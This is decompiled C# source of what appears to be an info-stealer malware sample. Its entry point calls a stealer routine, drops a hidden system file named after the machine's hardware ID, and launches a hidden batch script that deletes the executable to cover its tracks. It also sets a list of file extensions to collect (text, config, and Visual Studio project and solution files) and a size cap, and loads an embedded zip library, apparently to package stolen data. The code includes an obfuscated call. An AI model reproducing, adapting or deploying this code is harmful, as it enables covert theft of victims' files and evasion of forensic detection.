using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using Moist;
using Moist.Properties;

// Token: 0x02000003 RID: 3
internal class Class1
{
	// Token: 0x06000001 RID: 1 RVA: 0x00005408 File Offset: 0x00003608
	[STAThread]
	private static void Main()
	{
		AppDomain.CurrentDomain.AssemblyResolve += Class1.smethod_0;
		Stealer.GetStealer();
		File.AppendAllText(Help.LocalData + "\\" + Help.HWID, Help.HWID);
		File.SetAttributes(Help.LocalData + "\\" + Help.HWID, FileAttributes.Hidden | FileAttributes.System);
		string text = Path.GetTempFileName() + ".bat";
		using (StreamWriter streamWriter = new StreamWriter(text))
		{
			streamWriter.WriteLine("@echo off");
			streamWriter.WriteLine("timeout 4 > NUL");
			streamWriter.WriteLine("DEL \"" + Path.GetFileName(new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name) + "\" /f /q");
		}
		Process.Start(new ProcessStartInfo
		{
			FileName = text,
			CreateNoWindow = true,
			ErrorDialog = false,
			UseShellExecute = false,
			WindowStyle = ProcessWindowStyle.Hidden
		});
		Environment.Exit(0);
	}

	// Token: 0x06000002 RID: 2 RVA: 0x0000446C File Offset: 0x0000266C
	public Class1()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x06000003 RID: 3 RVA: 0x00005520 File Offset: 0x00003720
	// Note: this type is marked as 'beforefieldinit'.
	static Class1()
	{
		Class40.gcO0h7LzslQIW();
		Class1.string_0 = "763995249";
		Class1.int_0 = 10500000;
		Class1.string_1 = new string[]
		{
			".txt",
			".rpd",
			".suo",
			".config",
			".cs",
			".csproj",
			".tlp",
			".sln"
		};
	}

	// Token: 0x06000004 RID: 4 RVA: 0x00005594 File Offset: 0x00003794
	[CompilerGenerated]
	internal static Assembly smethod_0(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		Assembly result;
		if (resolveEventArgs_0.Name.Contains("DotNetZip"))
		{
			result = Assembly.Load(Resources.DotNetZip);
		}
		else
		{
			result = null;
		}
		return result;
	}

	// Token: 0x04000001 RID: 1
	public static string string_0;

	// Token: 0x04000002 RID: 2
	public static int int_0;

	// Token: 0x04000003 RID: 3
	public static string[] string_1;
}
